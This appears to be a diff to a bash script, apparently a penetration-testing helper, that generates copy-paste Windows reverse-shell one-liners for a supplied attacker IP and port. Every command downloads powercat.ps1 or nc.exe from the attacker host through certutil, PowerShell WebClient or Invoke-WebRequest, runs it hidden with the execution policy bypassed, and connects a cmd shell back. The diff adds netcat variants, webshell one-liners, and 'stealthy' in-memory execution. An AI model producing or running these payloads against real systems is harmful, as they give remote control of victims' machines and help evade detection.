@@ -42,37 +42,83 @@ else
 fi
 echo ""
 
-# PowerShell script name
+# Script and binary names
 ps_script="powercat.ps1"
+nc_binary="nc.exe"
 
 echo "==================================="
 echo "Copy-paste commands below:"
 echo "==================================="
 echo ""
 
-echo "# Method 1: Certutil Download + Execute"
+echo "###################################"
+echo "# POWERCAT REVERSE SHELLS"
+echo "###################################"
+echo ""
+
+echo "# Powercat Method 1: Certutil Download + Execute"
 printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s" && powershell -NoP -W Hidden -ExecutionPolicy Bypass -File "%s\\%s" -c %s -p %s -e cmd\n' \
   "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
 echo ""
 
-echo "# Method 2: PowerShell WebClient DownloadFile + Execute"
+echo "# Powercat Method 2: PowerShell WebClient DownloadFile + Execute"
 printf 'powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('"'"'http://%s/%s'"'"','"'"'%s\\%s'"'"'); powershell -NoP -ExecutionPolicy Bypass -File '"'"'%s\\%s'"'"' -c %s -p %s -e cmd"\n' \
   "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
 echo ""
 
-echo "# Method 3: PowerShell WebClient DownloadString (Execute in Memory)"
+echo "# Powercat Method 3: PowerShell WebClient DownloadString (Execute in Memory - STEALTHY)"
 printf 'powershell -NoP -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"'); powercat -c %s -p %s -e cmd"\n' \
   "$ip" "$ps_script" "$ip" "$lport"
 echo ""
 
-echo "# Method 4: PowerShell Invoke-WebRequest + Execute"
+echo "# Powercat Method 4: PowerShell Invoke-WebRequest + Execute"
 printf 'powershell -NoP -W Hidden -c "iwr http://%s/%s -OutFile '"'"'%s\\%s'"'"' -UseBasicParsing; powershell -NoP -ExecutionPolicy Bypass -File '"'"'%s\\%s'"'"' -c %s -p %s -e cmd"\n' \
   "$ip" "$ps_script" "$output_dir" "$ps_script" "$output_dir" "$ps_script" "$ip" "$lport"
 echo ""
 
-echo "# Method 5: PowerShell IEX with iwr (Execute in Memory)"
+echo "# Powercat Method 5: PowerShell IEX with iwr (Execute in Memory - STEALTHY)"
 printf 'powershell -NoP -W Hidden -c "IEX (iwr http://%s/%s -UseBasicParsing); powercat -c %s -p %s -e cmd"\n' \
   "$ip" "$ps_script" "$ip" "$lport"
+echo ""
+
+echo "###################################"
+echo "# NETCAT (NC.EXE) REVERSE SHELLS"
+echo "###################################"
+echo ""
+
+echo "# NC Method 1: Certutil Download + Execute"
+printf 'certutil -f -urlcache -split http://%s/%s "%s\\%s" && "%s\\%s" %s %s -e cmd\n' \
+  "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
+echo ""
+
+echo "# NC Method 2: PowerShell WebClient DownloadFile + Execute"
+printf 'powershell -NoP -W Hidden -c "(New-Object Net.WebClient).DownloadFile('"'"'http://%s/%s'"'"','"'"'%s\\%s'"'"'); Start-Process '"'"'%s\\%s'"'"' -ArgumentList '"'"'%s %s -e cmd'"'"' -WindowStyle Hidden"\n' \
+  "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
+echo ""
+
+echo "# NC Method 3: PowerShell Invoke-WebRequest + Execute"
+printf 'powershell -NoP -W Hidden -c "iwr http://%s/%s -OutFile '"'"'%s\\%s'"'"' -UseBasicParsing; Start-Process '"'"'%s\\%s'"'"' -ArgumentList '"'"'%s %s -e cmd'"'"' -WindowStyle Hidden"\n' \
+  "$ip" "$nc_binary" "$output_dir" "$nc_binary" "$output_dir" "$nc_binary" "$ip" "$lport"
+echo ""
+
+echo "###################################"
+echo "# WEBSHELL ONE-LINERS (SHORTEST)"
+echo "###################################"
+echo ""
+
+echo "# Powercat - In-Memory (Best for webshells):"
+printf 'powershell -c "IEX(New-Object Net.WebClient).DownloadString('"'"'http://%s/%s'"'"');powercat -c %s -p %s -e cmd"\n' \
+  "$ip" "$ps_script" "$ip" "$lport"
+echo ""
+
+echo "# Powercat - IWR Short Version:"
+printf 'powershell -c "IEX(iwr http://%s/%s -UseBasicParsing);powercat -c %s -p %s -e cmd"\n' \
+  "$ip" "$ps_script" "$ip" "$lport"
+echo ""
+
+echo "# NC.exe - Certutil (Most reliable for webshells):"
+printf 'certutil -urlcache -f http://%s/%s %%temp%%\\%s && %%temp%%\\%s %s %s -e cmd\n' \
+  "$ip" "$nc_binary" "$nc_binary" "$nc_binary" "$ip" "$lport"
 echo ""
 
 echo "==================================="
